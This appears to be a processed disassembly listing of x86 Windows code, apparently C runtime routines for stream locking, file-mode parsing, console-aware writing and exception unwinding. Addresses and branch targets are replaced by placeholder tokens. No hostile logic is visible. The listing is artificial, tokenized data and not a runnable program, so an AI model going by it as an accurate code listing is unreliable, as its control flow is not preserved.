push sub_40ded0
call sub_407aef
add esp 0x18
mov [ esi + edi - 0x1 ] 0x0
cmp eax 0xfffffffe
jne r-xdata
mov edi [ eax ]
inc ebx
push ebx
push esi
push sub_40ded0
call sub_407aef
add esp 0x18
cmp eax 0xfffffffe
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test eax eax
jns r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jne r-xdata
call sub_4078ae
cmp [ eax ] 0x22
jne r-xdata
mov [ esi ] 0x0
cmp eax 0xfffffffe
jne r-xdata
call sub_4078ae
cmp [ eax ] 0x22
jne r-xdata
or eax 0xffffffff
call sub_4078ae
mov [ eax ] edi
jmp r-xdata
call sub_4078ae
mov [ eax ] 0x22
call sub_4078ae
mov [ eax ] ebx
jmp r-xdata
sub_407d8c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407ca0
add esp 0x18
pop ebp
retn
sub_407dac
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40cb17
call sub_407aef
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_407dd5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40cb17
call sub_407aef
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_407e05
mov eax [ rwxdata ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40c060
pop ecx
pop ecx
mov [ rwxdata ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rwxdata ] eax
xor edx edx
mov ecx rwxdata
jmp r-xdata
push 0x4
push esi
mov [ rwxdata ] esi
call sub_40c060
pop ecx
pop ecx
mov [ rwxdata ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rwxdata
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rwxdata ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rwxdata
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rwxdata
jl r-xdata
sub_407ed6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rwxdata
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rwxdata
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_40ecce
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_407f17
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_40ecce
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_407f49
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rwxdata
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rwxdata
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_40ebdd
pop ecx
pop ebp
retn
sub_407f85
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_40ebdd
pop ecx
pop ebp
retn
sub_407fb4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rwxdata ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov ebx 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edi [ ecx + 0x7f ]
mov edx 0x4000
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
test al al
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_40f5d9
add esp 0x14
test eax eax
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
inc [ rwxdata ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_40f963
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax edi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx edi
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_40f7fd
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_40f7fd
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_40f7fd
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or ebx 0x20000
jmp r-xdata
add esi 0x7
or ebx 0x10000
jmp r-xdata
sub_40824b
push 0x10
push r--data
call sub_408380
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rwxdata ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408375
mov eax edi
call sub_4083c5
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
push 0x38
call sub_40c01b
pop ecx
mov ecx [ rwxdata ]
mov [ ecx + esi * 4 ] eax
cmp eax ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
mov eax [ rwxdata ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rwxdata ]
mov edi [ eax + esi * 4 ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ eax + esi * 4 ]
call sub_409812
pop ecx
mov eax [ rwxdata ]
mov [ eax + esi * 4 ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rwxdata ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rwxdata ]
push [ eax + esi * 4 ]
push esi
call sub_407f17
pop ecx
pop ecx
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_40ec0c
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_407f85
pop ecx
pop ecx
sub_408380
push sub_408410
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rwxdata ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_408410
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rwxdata ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_405894
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_405894
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rwxdata
push edi
mov ecx ebx
call sub_4086db
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_408692
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_405894
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_405894
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_4086c2
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rwxdata
push edi
mov edx ebx
mov ecx eax
call sub_4086db
mov eax [ ebp + 0xc ]
push rwxdata
call sub_40fa10
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_405894
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_4086a9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_405894
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rwxdata ]
add esp 0x8
sub_4085a0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_408630
push [ fs : 0x0 ]
mov eax [ rwxdata ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_40fbe5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_40fc04
jmp r-xdata
sub_408630
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_405894
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_4085a0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_408692
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_4086c2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4086f2
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_40fdc0
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rwxdata ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_4078c1
mov [ eax ] edi
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_405894
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
jmp r-xdata
push esi
call sub_40b50c
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_40b354
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_40af3b
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_4078ae
mov [ eax ] 0x1c
call sub_4078c1
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_4078d4
pop ecx
jmp r-xdata
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_40c568
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_40fc07
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_40fda5
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_40fda5
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_40fc07
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_408def
push 0x10
push r--data
call sub_408380
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
call sub_407823
jmp r-xdata
cmp ebx [ rwxdata ]
jb r-xdata
call sub_4083c5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40ff5b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_4086f2
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408ebb
mov eax [ ebp - 0x1c ]
sub_408ec3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
pop ebp
retn
sub_408ee9
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
